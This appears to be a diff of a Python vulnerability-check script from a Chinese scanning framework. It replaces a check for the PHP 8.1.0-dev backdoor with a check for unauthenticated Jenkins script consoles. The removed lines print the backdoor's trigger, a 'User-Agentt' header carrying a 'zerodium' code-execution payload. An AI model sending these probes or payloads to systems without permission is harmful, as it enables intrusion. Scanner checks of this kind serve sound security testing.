@@ -7,25 +7,25 @@ urllib3.disable_warnings()
 _info = {
     "author" : "jijue",                      # POC作者
     "version" : "1",                    # POC版本，默认是1  
-    "CreateDate" : "2021-06-07",        # POC创建时间
-    "UpdateDate" : "2021-06-07",        # POC创建时间
+    "CreateDate" : "2021-06-09",        # POC创建时间
+    "UpdateDate" : "2021-06-09",        # POC创建时间
     "PocDesc" : """
     略  
     """,                                # POC描述，写更新描述，没有就不写
 
-    "name" : "php_v8开发版后门",                        # 漏洞名称
-    "AppName" : "php",                     # 漏洞应用名称
-    "AppVersion" : "PHP 8.1.0-dev 版本",                  # 漏洞应用版本
-    "VulnDate" : "2021-03-28",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
+    "name" : "Jenkins未授权访问",                        # 漏洞名称
+    "AppName" : "Jenkins",                     # 漏洞应用名称
+    "AppVersion" : "无",                  # 漏洞应用版本
+    "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
     "VulnDesc" : """
-    PHP 8.1.0-dev 版本于 2021 年 3 月 28 日被植入后门，但后门很快被发现并移除。当服务器上存在此后门时，攻击者可以通过发送User-Agentt标头来执行任意代码。
+    Jenkins未设置密码，导致未授权访问。
     """,                                # 漏洞简要描述
 
-    "fofa-dork":"无",                     # fofa搜索语句
+    "fofa-dork":"",                     # fofa搜索语句
     "example" : "",                     # 存在漏洞的演示url，写一个就可以了
     "exp_img" : "",                      # 先不管  
 
-    "timeout" : 5,                      # 超时设定
+    "timeout" : 10,                      # 超时设定
 }
 
 def verify(host,proxy):
@@ -37,7 +37,7 @@ def verify(host,proxy):
     不存在漏洞：vuln = [False,""]
     """
     vuln = [False,""]
-    url = url_handle(host) + "/" # url自己按需调整
+    url = url_handle(host) + "/script" # url自己按需调整
 
     proxies = None
     if proxy:
@@ -47,7 +47,6 @@ def verify(host,proxy):
         }
 
     headers = {"User-Agent":get_random_ua(),
-                "User-Agentt":"zerodiumvar_dump(133*133);",
                 "Connection":"close",
                 # "Content-Type": "application/x-www-form-urlencoded",
                 }
@@ -57,7 +56,7 @@ def verify(host,proxy):
         检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
         """
         req = requests.get(url,headers = headers , proxies = proxies ,timeout = _info["timeout"],verify = False)
-        if req.status_code == 200 and "int(17689)" in req.text:
+        if req.status_code == 200 and "Script Console" in req.text:
             vuln = [True,req.text]
         else:
             vuln = [False,req.text]
